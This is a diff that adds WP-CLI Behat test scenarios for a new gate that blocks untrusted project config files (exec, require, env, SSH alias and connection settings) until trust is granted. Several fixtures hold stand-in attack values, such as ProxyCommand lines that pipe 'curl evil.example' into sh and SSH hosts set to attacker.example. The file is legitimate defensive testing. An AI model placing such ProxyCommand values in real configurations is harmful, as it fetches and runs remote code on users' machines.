@@ -1143,3 +1143,710 @@ Feature: Have a config file
       """
       ssh: user@example.com/var/www/bar
       """
+
+  Scenario: Untrusted project exec directive in non-interactive environment
+    Given an empty directory
+    And a wp-cli.yml file:
+      """
+      exec:
+        - echo 'MALICIOUS_EXEC';
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=false wp eval "echo 'hello';" 2>&1`
+    Then STDOUT should contain:
+      """
+      Execution of 'exec' directives rejected by
+      """
+    And STDOUT should not contain:
+      """
+      MALICIOUS_EXEC
+      """
+
+  Scenario: Untrusted project require directive in non-interactive environment
+    Given an empty directory
+    And a custom-cmd.php file:
+      """
+      <?php
+      echo 'MALICIOUS_REQUIRE';
+      """
+    And a wp-cli.yml file:
+      """
+      require:
+        - custom-cmd.php
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=false wp eval "echo 'hello';" 2>&1`
+    Then STDOUT should contain:
+      """
+      Execution of 'require' directives rejected by
+      """
+    And STDOUT should not contain:
+      """
+      MALICIOUS_REQUIRE
+      """
+
+  Scenario: Trust project config via environment variable
+    Given an empty directory
+    And a wp-cli.yml file:
+      """
+      exec:
+        - echo 'EXECUTED_FROM_CONFIG';
+      """
+
+    When I run `WP_CLI_TRUST_PROJECT_CONFIG=true wp eval --skip-wordpress "echo 'DONE';" 2>&1`
+    Then STDOUT should contain:
+      """
+      EXECUTED_FROM_CONFIG
+      """
+
+  Scenario: Trust project config via CLI runtime flag
+    Given an empty directory
+    And a wp-cli.yml file:
+      """
+      exec:
+        - echo 'RUNTIME_FLAG_TRUSTED';
+      """
+
+    When I run `WP_CLI_TRUST_PROJECT_CONFIG=0 wp --trust-project-config eval --skip-wordpress "echo 'DONE';" 2>&1`
+    Then STDOUT should contain:
+      """
+      RUNTIME_FLAG_TRUSTED
+      """
+
+  Scenario: Project config cannot self-authorize trust-project-config
+    Given an empty directory
+    And a wp-cli.yml file:
+      """
+      trust-project-config: true
+      exec:
+        - echo 'UNAUTHORIZED_SELF_TRUST';
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=false wp eval --skip-wordpress "echo 'DONE';" 2>&1`
+    Then STDOUT should contain:
+      """
+      Execution of 'exec' directives rejected by
+      """
+    And STDOUT should not contain:
+      """
+      UNAUTHORIZED_SELF_TRUST
+      """
+
+  Scenario: Global config trust-project-config path list allows a project config
+    Given an empty directory
+    And a user-config.yml file:
+      """
+      trust-project-config:
+        - .
+      """
+    And a wp-cli.yml file:
+      """
+      exec:
+        - echo 'PERSISTED_TRUST_EXEC';
+      """
+
+    When I run `WP_CLI_TRUST_PROJECT_CONFIG=false WP_CLI_CONFIG_PATH=user-config.yml wp eval --skip-wordpress "echo 'DONE';" 2>&1`
+    Then STDOUT should contain:
+      """
+      PERSISTED_TRUST_EXEC
+      """
+
+  Scenario: Project config with dangerous env directive is gated
+    Given an empty directory
+    And a wp-cli.yml file:
+      """
+      env:
+        WP_CLI_PACKAGES_DIR: ./pkg
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=false wp cli version 2>&1`
+    Then STDOUT should contain:
+      """
+      Execution of 'project configuration' directives rejected by WP_CLI_TRUST_PROJECT_CONFIG.
+      """
+
+  Scenario: Project config overriding an env key set in the global config is gated
+    Given an empty directory
+    And a user-config.yml file:
+      """
+      env:
+        WP_CLI_PACKAGES_DIR: /tmp/global-packages
+      """
+    And a wp-cli.yml file:
+      """
+      env:
+        WP_CLI_PACKAGES_DIR: ./evil-packages
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=false WP_CLI_CONFIG_PATH=user-config.yml wp cli version 2>&1`
+    Then STDOUT should contain:
+      """
+      Execution of 'project configuration' directives rejected by WP_CLI_TRUST_PROJECT_CONFIG.
+      """
+
+  Scenario: Passing --yes flag does not bypass project config trust
+    Given an empty directory
+    And a wp-cli.yml file:
+      """
+      exec:
+        - echo 'MALICIOUS_EXEC_WITH_YES';
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=false wp cli version --yes 2>&1`
+    Then STDOUT should contain:
+      """
+      Execution of 'exec' directives rejected by WP_CLI_TRUST_PROJECT_CONFIG.
+      """
+    And STDOUT should not contain:
+      """
+      MALICIOUS_EXEC_WITH_YES
+      """
+
+  Scenario: Project config with ssh-args or alias ssh-args is gated
+    Given an empty directory
+    And a wp-cli.yml file:
+      """
+      @prod:
+        ssh: example.com
+        ssh-args: -oProxyCommand=curl evil.example|sh
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=false wp cli version 2>&1`
+    Then STDOUT should contain:
+      """
+      Execution of 'project configuration' directives rejected by WP_CLI_TRUST_PROJECT_CONFIG.
+      """
+
+  Scenario: Project config redefining an existing global alias's ssh-args is gated
+    Given an empty directory
+    And a user-config.yml file:
+      """
+      @prod:
+        ssh: prod.example.com
+      """
+    And a wp-cli.yml file:
+      """
+      @prod:
+        ssh: prod.example.com
+        ssh-args: -oProxyCommand=curl evil.example|sh
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=false WP_CLI_CONFIG_PATH=user-config.yml wp cli version 2>&1`
+    Then STDOUT should contain:
+      """
+      Execution of 'project configuration' directives rejected by WP_CLI_TRUST_PROJECT_CONFIG.
+      """
+
+  Scenario: Project alias pointing at a custom SSH config file is gated
+    Given an empty directory
+    And a ssh-config file:
+      """
+      Host *
+        ProxyCommand curl evil.example|sh
+      """
+    And a wp-cli.yml file:
+      """
+      @prod:
+        ssh: prod.example.com
+        ssh_config: ./ssh-config
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=false wp cli version 2>&1`
+    Then STDOUT should contain:
+      """
+      Execution of 'project configuration' directives rejected by WP_CLI_TRUST_PROJECT_CONFIG.
+      """
+
+  Scenario: Project config redefining an existing global alias's SSH host is gated
+    Given an empty directory
+    And a user-config.yml file:
+      """
+      @prod:
+        ssh: prod.example.com
+      """
+    And a wp-cli.yml file:
+      """
+      @prod:
+        ssh: attacker.example.com
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=false WP_CLI_CONFIG_PATH=user-config.yml wp cli version 2>&1`
+    Then STDOUT should contain:
+      """
+      Execution of 'project configuration' directives rejected by WP_CLI_TRUST_PROJECT_CONFIG.
+      """
+
+  Scenario: Project alias repeating the trusted global definition is not gated
+    Given an empty directory
+    And a user-config.yml file:
+      """
+      @prod:
+        ssh: prod.example.com
+      """
+    And a wp-cli.yml file:
+      """
+      @prod:
+        ssh: prod.example.com
+      """
+
+    When I run `WP_CLI_TRUST_PROJECT_CONFIG=false WP_CLI_CONFIG_PATH=user-config.yml wp cli version 2>&1`
+    Then STDOUT should contain:
+      """
+      WP-CLI
+      """
+
+  Scenario: Untrusted project config without a trust decision errors outside a TTY
+    Given an empty directory
+    And a wp-cli.yml file:
+      """
+      exec:
+        - echo 'NO_DECISION';
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG= wp cli version`
+    Then STDERR should contain:
+      """
+      Untrusted project configuration file
+      """
+    And STDERR should contain:
+      """
+      - exec: echo 'NO_DECISION';
+      """
+    And STDERR should contain:
+      """
+      --trust-project-config
+      """
+    And STDOUT should not contain:
+      """
+      NO_DECISION
+      """
+    And the return code should be 1
+
+    # --yes answers command prompts, it does not grant trust.
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG= wp cli version --yes`
+    Then STDERR should contain:
+      """
+      Untrusted project configuration file
+      """
+    And STDOUT should not contain:
+      """
+      NO_DECISION
+      """
+    And the return code should be 1
+
+  Scenario: Untrusted wp-cli.local.yml is gated like wp-cli.yml
+    Given an empty directory
+    And a wp-cli.local.yml file:
+      """
+      exec:
+        - echo 'LOCAL_EXEC';
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=false wp cli version`
+    Then STDERR should contain:
+      """
+      Execution of 'exec' directives rejected by WP_CLI_TRUST_PROJECT_CONFIG.
+      """
+    And STDOUT should not contain:
+      """
+      LOCAL_EXEC
+      """
+
+  Scenario: Trust project config via a path or a denial on the command line
+    Given an empty directory
+    And a wp-cli.yml file:
+      """
+      exec:
+        - echo 'CLI_PATH_TRUSTED';
+      """
+
+    When I run `WP_CLI_TRUST_PROJECT_CONFIG= wp --trust-project-config={RUN_DIR} cli version`
+    Then STDOUT should contain:
+      """
+      CLI_PATH_TRUSTED
+      """
+
+    When I run `WP_CLI_TRUST_PROJECT_CONFIG= wp --trust-project-config={RUN_DIR}/wp-cli.yml cli version`
+    Then STDOUT should contain:
+      """
+      CLI_PATH_TRUSTED
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG= wp --trust-project-config=/does/not/exist cli version`
+    Then STDERR should contain:
+      """
+      Untrusted project configuration file
+      """
+    And STDOUT should not contain:
+      """
+      CLI_PATH_TRUSTED
+      """
+
+    # An empty value or a trailing comma must not resolve to the current directory.
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG= wp --trust-project-config= cli version`
+    Then STDERR should contain:
+      """
+      Untrusted project configuration file
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=/does/not/exist, wp cli version`
+    Then STDERR should contain:
+      """
+      Untrusted project configuration file
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=true wp --trust-project-config=false cli version`
+    Then STDERR should contain:
+      """
+      Execution of 'exec' directives rejected by --trust-project-config.
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=true wp --no-trust-project-config cli version`
+    Then STDERR should contain:
+      """
+      Execution of 'exec' directives rejected by --trust-project-config.
+      """
+
+  Scenario: Trust project config via a path or a denial in the global config
+    Given an empty directory
+    And a wp-cli.yml file:
+      """
+      exec:
+        - echo 'GLOBAL_PATH_TRUSTED';
+      """
+    And a config/deny.yml file:
+      """
+      trust-project-config: false
+      """
+    And a config/allow-config-dir.yml file:
+      """
+      trust-project-config:
+        - .
+      """
+    And a config/allow-parent.yml file:
+      """
+      trust-project-config: ..
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=true WP_CLI_CONFIG_PATH={RUN_DIR}/config/deny.yml wp cli version`
+    Then STDERR should contain:
+      """
+      Execution of 'exec' directives rejected by trust-project-config setting in global config.
+      """
+
+    # Relative paths resolve against the config file that lists them, not against the current directory.
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG= WP_CLI_CONFIG_PATH={RUN_DIR}/config/allow-config-dir.yml wp cli version`
+    Then STDERR should contain:
+      """
+      Untrusted project configuration file
+      """
+    And STDOUT should not contain:
+      """
+      GLOBAL_PATH_TRUSTED
+      """
+
+    When I run `WP_CLI_TRUST_PROJECT_CONFIG= WP_CLI_CONFIG_PATH={RUN_DIR}/config/allow-parent.yml wp cli version`
+    Then STDOUT should contain:
+      """
+      GLOBAL_PATH_TRUSTED
+      """
+
+  Scenario: The global config overrides the system config for trust-project-config
+    Given an empty directory
+    And a wp-cli.yml file:
+      """
+      exec:
+        - echo 'SYSTEM_VS_GLOBAL';
+      """
+    And a system.yml file:
+      """
+      trust-project-config: true
+      """
+    And a user.yml file:
+      """
+      trust-project-config: false
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG= WP_CLI_SYSTEM_SETTINGS_PATH={RUN_DIR}/system.yml WP_CLI_CONFIG_PATH={RUN_DIR}/user.yml wp cli version`
+    Then STDERR should contain:
+      """
+      Execution of 'exec' directives rejected by trust-project-config setting in global config.
+      """
+    And STDOUT should not contain:
+      """
+      SYSTEM_VS_GLOBAL
+      """
+
+    Given a system.yml file:
+      """
+      trust-project-config: false
+      """
+    And a user.yml file:
+      """
+      trust-project-config: true
+      """
+
+    When I run `WP_CLI_TRUST_PROJECT_CONFIG= WP_CLI_SYSTEM_SETTINGS_PATH={RUN_DIR}/system.yml WP_CLI_CONFIG_PATH={RUN_DIR}/user.yml wp cli version`
+    Then STDOUT should contain:
+      """
+      SYSTEM_VS_GLOBAL
+      """
+
+    Given a user.yml file:
+      """
+      trust-project-config:
+        - /some/other/project
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG= WP_CLI_SYSTEM_SETTINGS_PATH={RUN_DIR}/system.yml WP_CLI_CONFIG_PATH={RUN_DIR}/user.yml wp cli version`
+    Then STDERR should contain:
+      """
+      Execution of 'exec' directives rejected by trust-project-config setting in system config.
+      """
+
+  Scenario Outline: Project config introducing a root-level connection setting is gated
+    Given an empty directory
+    And a wp-cli.yml file:
+      """
+      <key>: <value>
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=false wp cli version`
+    Then STDERR should contain:
+      """
+      Execution of 'project configuration' directives rejected by WP_CLI_TRUST_PROJECT_CONFIG.
+      """
+
+    Examples:
+      | key        | value                    |
+      | ssh        | user@attacker.example    |
+      | http       | https://attacker.example |
+      | ssh_config | ./ssh-config             |
+      | proxyjump  | user@attacker.example    |
+      | key        | ./attacker-key           |
+
+  Scenario: Project config repeating a root-level connection setting from the global config is not gated
+    Given an empty directory
+    And a user-config.yml file:
+      """
+      key: ~/.ssh/deploy_key
+      """
+    And a wp-cli.yml file:
+      """
+      key: ~/.ssh/deploy_key
+      """
+
+    When I run `WP_CLI_TRUST_PROJECT_CONFIG=false WP_CLI_CONFIG_PATH=user-config.yml wp cli version`
+    Then STDOUT should contain:
+      """
+      WP-CLI
+      """
+
+    Given a wp-cli.yml file:
+      """
+      key: ./attacker-key
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=false WP_CLI_CONFIG_PATH=user-config.yml wp cli version`
+    Then STDERR should contain:
+      """
+      Execution of 'project configuration' directives rejected by WP_CLI_TRUST_PROJECT_CONFIG.
+      """
+
+  Scenario: Protected commands do not gate the require and exec directives they never load
+    Given an empty directory
+    And a custom.php file:
+      """
+      <?php
+      echo 'PROTECTED_REQUIRE';
+      """
+    And a wp-cli.yml file:
+      """
+      exec:
+        - echo 'PROTECTED_EXEC';
+      require:
+        - custom.php
+      """
+
+    When I run `WP_CLI_TRUST_PROJECT_CONFIG= wp cli info`
+    Then STDOUT should contain:
+      """
+      WP-CLI version
+      """
+    And STDOUT should not contain:
+      """
+      PROTECTED_EXEC
+      """
+    And STDOUT should not contain:
+      """
+      PROTECTED_REQUIRE
+      """
+
+    # Other directives still apply to protected commands and stay gated.
+    Given a wp-cli.yml file:
+      """
+      env:
+        WP_CLI_PACKAGES_DIR: ./pkg
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG= wp cli info`
+    Then STDERR should contain:
+      """
+      Untrusted project configuration file
+      """
+
+  @skip-windows @skip-macos
+  Scenario: The trust-project-config parameter is not passed on to the remote WP-CLI instance
+    When I try `wp --debug --ssh=wordpress --trust-project-config --trust-project-config=/srv/project cli version`
+    Then STDERR should contain:
+      """
+      Running SSH command: ssh -T -vvv 'wordpress' 'WP_CLI_SSH_RUN=1 wp --debug cli version'
+      """
+
+  @skip-windows @skip-macos
+  Scenario: Answering the trust prompt with "a" stores the approval for the whole inherit chain
+    Given an empty directory
+    And a base.yml file:
+      """
+      exec:
+        - echo 'INHERITED_' . 'EXEC';
+      """
+    And a wp-cli.yml file:
+      """
+      _:
+        inherit: base.yml
+      """
+    And a config/config.yml file:
+      """
+      color: false
+      """
+
+    # `script` allocates a pseudo-terminal, which is what turns the hard error into a prompt.
+    When I try `printf 'a\n' | WP_CLI_TRUST_PROJECT_CONFIG= WP_CLI_CONFIG_PATH={RUN_DIR}/config/config.yml script -qec "wp cli version" /dev/null`
+    Then STDOUT should contain:
+      """
+      Do you trust this project configuration? [y/n/a]
+      """
+    And STDOUT should contain:
+      """
+      - exec: echo 'INHERITED_' . 'EXEC';
+      """
+    And STDOUT should contain:
+      """
+      Success: Added
+      """
+    And STDOUT should contain:
+      """
+      INHERITED_EXEC
+      """
+    And the return code should be 0
+    And the config/trusted-configs.json file should exist
+
+    # The stored approval carries over to later, non-interactive runs.
+    When I run `WP_CLI_TRUST_PROJECT_CONFIG= WP_CLI_CONFIG_PATH={RUN_DIR}/config/config.yml wp cli version`
+    Then STDOUT should contain:
+      """
+      INHERITED_EXEC
+      """
+
+    # Changing an inherited file invalidates it, even though wp-cli.yml itself is untouched.
+    Given a base.yml file:
+      """
+      exec:
+        - echo 'INHERITED_EXEC_CHANGED';
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG= WP_CLI_CONFIG_PATH={RUN_DIR}/config/config.yml wp cli version`
+    Then STDERR should contain:
+      """
+      has been modified since it was trusted
+      """
+    And STDOUT should not contain:
+      """
+      INHERITED_EXEC_CHANGED
+      """
+    And the return code should be 1
+
+  @skip-windows @skip-macos
+  Scenario: Answering the trust prompt with "y" allows a single run and "n" denies
+    Given an empty directory
+    And a wp-cli.yml file:
+      """
+      exec:
+        - echo 'PROMPTED_' . 'EXEC';
+      """
+    And a config/config.yml file:
+      """
+      color: false
+      """
+
+    When I try `printf 'n\n' | WP_CLI_TRUST_PROJECT_CONFIG= WP_CLI_CONFIG_PATH={RUN_DIR}/config/config.yml script -qec "wp cli version" /dev/null`
+    Then STDOUT should contain:
+      """
+      aborted by user
+      """
+    And STDOUT should not contain:
+      """
+      PROMPTED_EXEC
+      """
+    And the return code should be 1
+    And the config/trusted-configs.json file should not exist
+
+    When I try `printf 'y\n' | WP_CLI_TRUST_PROJECT_CONFIG= WP_CLI_CONFIG_PATH={RUN_DIR}/config/config.yml script -qec "wp cli version" /dev/null`
+    Then STDOUT should contain:
+      """
+      PROMPTED_EXEC
+      """
+    And the return code should be 0
+    And the config/trusted-configs.json file should not exist
+
+    # An empty answer denies, and "y" did not persist anything.
+    When I try `printf '\n' | WP_CLI_TRUST_PROJECT_CONFIG= WP_CLI_CONFIG_PATH={RUN_DIR}/config/config.yml script -qec "wp cli version" /dev/null`
+    Then STDOUT should contain:
+      """
+      aborted by user
+      """
+    And the return code should be 1
+
+  @skip-windows
+  Scenario: A symlinked project config does not share the approval of its target
+    Given an empty directory
+    And a safe/wp-cli.yml file:
+      """
+      require:
+        - bootstrap.php
+      """
+    And a safe/bootstrap.php file:
+      """
+      <?php
+      echo 'SAFE_BOOTSTRAP';
+      """
+    And a evil/bootstrap.php file:
+      """
+      <?php
+      echo 'EVIL_BOOTSTRAP';
+      """
+    And a config/config.yml file:
+      """
+      trust-project-config:
+        - ../safe
+      """
+
+    When I run `ln -s {RUN_DIR}/safe/wp-cli.yml {RUN_DIR}/evil/wp-cli.yml`
+    And I run `WP_CLI_TRUST_PROJECT_CONFIG= WP_CLI_CONFIG_PATH={RUN_DIR}/config/config.yml wp cli version` from 'safe'
+    Then STDOUT should contain:
+      """
+      SAFE_BOOTSTRAP
+      """
+
+    # The symlink resolves `require` against evil/, so safe/'s approval must not carry over.
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG= WP_CLI_CONFIG_PATH={RUN_DIR}/config/config.yml wp cli version` from 'evil'
+    Then STDERR should contain:
+      """
+      Untrusted project configuration file
+      """
+    And STDOUT should not contain:
+      """
+      EVIL_BOOTSTRAP
+      """
+    And the return code should be 1
